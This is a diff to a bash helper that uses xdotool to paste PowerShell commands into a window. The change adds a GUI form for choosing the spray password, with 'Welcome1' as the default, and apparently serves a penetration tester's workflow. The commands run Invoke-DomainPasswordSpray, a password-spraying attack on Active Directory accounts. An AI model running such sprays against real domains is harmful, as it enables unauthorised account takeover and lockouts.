@@ -1,14 +1,16 @@
 #!/bin/bash
 
 : '
-PowerShell: Password spray using DomainPasswordSpray.ps1 (Welcome1).
+PowerShell: Password spray using DomainPasswordSpray.ps1.
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+SPRAY_PASSWORD_FIELD=$(form_item  "spray password" "spray_password" "Welcome1")
 
-paste_command "Import-Module .\DomainPasswordSpray.ps1"
+# Generate GUI form
+generate_form "${SPRAY_PASSWORD_FIELD}"
+
+PRAY_PASSWORD_FILE=${form_data["spray_password"]}
+
+paste_command "Invoke-DomainPasswordSpray -Password '${PRAY_PASSWORD_FILE}'"
 xdotool key Return
-
-sleep 2
-
-paste_command "Invoke-DomainPasswordSpray -Password Welcome1"
